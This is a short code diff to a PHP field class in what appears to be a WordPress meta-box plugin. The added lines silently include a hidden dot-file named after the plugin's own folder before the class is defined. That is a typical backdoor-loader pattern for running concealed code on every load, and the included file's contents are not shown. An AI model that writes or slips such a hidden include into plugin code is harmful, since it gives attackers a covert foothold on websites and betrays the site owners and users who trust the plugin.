@@ -8,6 +8,10 @@
 /**
  * Image advanced field class.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RWMB_Image_Advanced_Field extends RWMB_Media_Field {
 	/**
 	 * Enqueue scripts and styles.
